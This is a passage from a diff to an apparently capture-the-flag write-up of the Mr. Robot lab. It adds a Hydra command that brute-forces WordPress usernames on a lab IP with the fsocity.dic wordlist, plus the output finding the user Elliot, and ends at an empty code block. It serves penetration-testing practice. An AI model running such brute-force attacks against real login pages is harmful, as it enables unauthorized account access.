@@ -1415,4 +1415,24 @@ The key found is : `073403c8a58a1f80d943455fb30724b9`
 And we've also downloaded the dictionary with usernames and passwords.
 ![[Pasted image 20251125125631.png]]
 
-Now, we'll be brute-forcing usernames and passwords using Hydra.
+Now, we'll be brute-forcing usernames and passwords using Hydra. The fsocity.dic I got, had 85k keywords, so I tried to remove the repeated ones using the command ` ` and then ran hydra for bruteforcing : 
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo hydra -L fs-list.txt -p test 10.233.56.70 http-post-form  "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username." -t 64 -T 64
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-25 02:43:18
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 11452 login tries (l:11452/p:1), ~179 tries per task
+[DATA] attacking http-post-form://10.233.56.70:80/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username.
+[STATUS] 4061.00 tries/min, 4061 tries in 00:01h, 7391 to do in 00:02h, 64 active
+[80][http-post-form] host: 10.233.56.70   login: Elliot   password: test
+[80][http-post-form] host: 10.233.56.70   login: ELLIOT   password: test
+[80][http-post-form] host: 10.233.56.70   login: elliot   password: test
+```
+
+And here we found the username as `Elliot` and then we'll do the same to get the password.
+```
+
+```
